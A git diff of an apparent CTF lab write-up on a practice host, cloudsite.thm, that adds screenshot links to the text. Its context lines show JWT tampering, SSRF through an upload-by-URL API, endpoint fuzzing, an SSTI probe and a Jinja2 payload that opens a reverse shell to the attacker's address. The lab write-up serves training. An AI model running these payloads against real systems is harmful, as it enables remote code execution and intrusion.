@@ -45,6 +45,7 @@ Navigating to cloudsite.thm we are greeted with a landing page which has a login
 There is a sign-up button; let's register an account, login and see what we can find. We are presented with a dashboard after logging in.
 
 Using Burp to intercept the request, we see a JWT token is assigned after login. Using JWT Editor, we decoded the token to be:
+![Landing Page](images/Rabbit_ctf_img/img2.jpg)
 
 ```json
 {
@@ -71,6 +72,7 @@ This gave usthe privilege we needed to access the dashboard.
 ---
 
 ## SSRF Discovery via Upload Feature
+![Landing Page](images/Rabbit_ctf_img/img3.jpg)
 Loking at the dashboard, we see 2 upload functions. One for uploading files from local machine and the other from a URL. Seeing this, my first thought was there may be some kind of File upload vulnerability i can exploit, so that is what i focused on.
 
 The next step was to simply try and upload a file via both methods and intercept the request. On our machine we set a host using python `python3 -m http.server 9000`
@@ -84,7 +86,7 @@ Since we are dealing with an Api, we can try fuzzing to see if we can find any h
 ```bash
 ffuf -u https://storage.cloudsite.thm/api/FUZZ -w api-endpoints.txt
 ```
-
+![Landing Page](images/Rabbit_ctf_img/img6.jpg)
 Direct access was denied (`403`). By simply navigating to the endpoint via browser we get a message saying it can only be accessed by Localhost at port 8000. Since we have confirmed SSRF can try and manipulate the server to do just that by abusing the `api/store-url` upload feature by adding the below JSON to the request body:
 
 ```json
@@ -126,7 +128,7 @@ so i added this to the request body:
 ```
 
 Then testing for SSTI, i used the following payload:
-
+![Landing Page](images/Rabbit_ctf_img/img9.jpg)
 ```json
 { "username": "${{<%[%'"}}%\." }
 ```
@@ -134,6 +136,8 @@ Then testing for SSTI, i used the following payload:
 This revealed a **Jinja2 error**, confirming SSTI.
 
 ### Exploiting Jinja2 for RCE
+
+![Landing Page](images/Rabbit_ctf_img/img10.jpg)
 
 ```Python
 {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen("python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.8.137.194\",9001));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'").read() }}
